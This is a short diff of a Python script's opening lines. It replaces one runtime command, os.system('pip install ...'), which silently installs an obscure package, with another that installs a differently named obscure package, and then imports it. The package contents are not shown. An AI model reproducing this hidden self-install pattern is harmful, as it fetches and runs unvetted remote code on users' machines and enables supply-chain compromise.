@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringslibV2")
-import pythoncoloringslibV2
+os.system("pip install pyfontslibv2")
+import pyfontslibv2
 import httpx
 import threading
 import random
